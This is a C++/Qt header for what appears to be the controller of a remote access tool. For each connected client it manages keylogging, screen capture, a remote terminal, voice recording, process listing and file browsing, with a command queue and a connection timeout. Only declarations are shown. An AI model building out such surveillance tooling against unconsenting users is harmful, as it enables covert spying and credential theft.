#pragma once
#ifndef NETMANAGER_H
#define NETMANAGER_H

#include <winsock2.h>
#include <iostream>
#include <windowsx.h>
 
#include<time.h>
#include "mystruct.cpp"
#include "threadsafequeue.cpp"
#include <map>
#include <mstcpip.h>
#include <QObject>
#include <QMutex>

#include "mykeylogWindows.h"
#include "myscreenwindows.h"
#include "myterminalwindows.h"
#include "myvoicewindows.h"
#include "myprocesswindows.h"
#include "myfilewindows.h"

class mykeylogWindows;
class myscreenWindows;
class myterminalWindows;
class myvoiceWindows;
class myprocessWindows;
class myfileWindows;

class netManager : public QObject
{
    Q_OBJECT
public:
    mykeylogWindows* keylogwindows;
    myscreenWindows* screenwinodws;
    myterminalWindows* terminalwindows;
    myvoiceWindows* voicewindows;
    myprocessWindows* processwindows;
    myfileWindows* filewindows;
    QString name="";
    SOCKET sClient;
    int finishFlag = 0;//退出的标志 每个线程退出，finishFlag++
    bool state = false;//监听的标志

    ThreadSafeQueue<morder> orderQueue;

    netManager(SOCKET s);

    ~netManager();
    void finishNet();
    void start();
    void addOrder();

private:
    __time64_t lastTime;
    QMutex mutex;                  //send的锁

    void myRecv();
    void mySend();


    void detect();//60秒未通信即认为中断连接

    void cleanup();

    QString savePicture(char*,int len,int order);

signals:
    void signalSetInfo(SOCKET s,int col,QString m);
    void signalAddLog(QString,int);
    void signalDelInfo(SOCKET s);

    void signalAddTermResult(QString);
    void signalAddFilelist(mfile);
    void signalAddKeylog(QString);
    void signalAddProcess(int,QString);
    void signalAddImage(QString);

};


#endif // NETMANAGER_H
